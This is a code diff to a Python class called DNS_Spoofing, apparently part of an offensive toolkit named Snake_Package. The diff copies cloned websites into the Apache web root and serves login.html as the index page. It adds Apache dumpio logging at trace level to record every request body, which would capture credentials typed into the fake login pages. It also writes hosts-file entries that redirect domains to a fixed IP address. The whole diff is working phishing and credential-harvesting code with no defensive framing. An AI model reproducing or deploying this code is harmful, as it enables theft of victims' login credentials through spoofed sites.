@@ -32,6 +32,11 @@ class DNS_Spoofing:
                         shutil.copytree(Curent_dir2+'Snake_Package/sites/'+f'{folder}', '/var/www/html/'+f'{folder}')
                         enable = "sudo a2ensite  "+f'{folder}'+"  >/dev/null 2>&1"
                         os.system(enable)
+                command1 = 'sudo a2enmod dump_io >/dev/null 2>&1'
+                subprocess.call(command1,shell=True,stderr=subprocess.PIPE)
+                os.system("systemctl restart apache2 >/dev/null 2>&1")
+                command = "sudo a2enmod dumpio >/dev/null 2>&1"
+                subprocess.call(command,shell=True,stderr=subprocess.PIPE)        
                 os.system("sudo a2enmod ssl > /dev/null 2>&1")                     
                 os.system("sudo a2dissite 000-default.conf >/dev/null 2>&1")
                 os.system("systemctl restart apache2 >/dev/null 2>&1")
@@ -69,6 +74,9 @@ class DNS_Spoofing:
                                 "\t\tDirectoryIndex login.html"+'\n'\
                                 "\t\tDirectoryIndex index.php"+'\n'\
                                 "\t</IfModule>"+'\n'\
+                                "\tDumpIOInput on"+'\n'\
+                                "\tDumpIOOutput on"+'\n'\
+                                "\tLogLevel dumpio:trace7"+'\n'\
                                 "</VirtualHost>"+'\n'\
                                 "<Directory "+"/var/www/html/"+f'{file}'+">"+'\n'+\
                                 "\tOptions FollowSymLinks"+'\n'\
@@ -91,9 +99,12 @@ class DNS_Spoofing:
                 with open(LOG_PATH+'/resources/hosts.txt','a') as hosts:                         
                    hosts.write('172.160.255.49  www.'+host+'.com     '+host+'.com'+'\n')       
         def unzip_web(self):
-            with ZipFile(LOG_PATH+'/sites.zip','r') as unzipweb :
-                unzipweb.extractall()
-                os.remove(LOG_PATH+'/sites.zip')          
+            if os.path.exists(Curent_dir2+'Snake_Package/sites'):
+                pass
+            else:     
+                with ZipFile(LOG_PATH+'/resources/sites.zip','r') as unzipweb :
+                    unzipweb.extractall(path=Curent_dir2+'Snake_Package/')
+                        
         def parse_args(self):
             parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
             parser.add_argument( '-S ',"--Show",action='store_true')
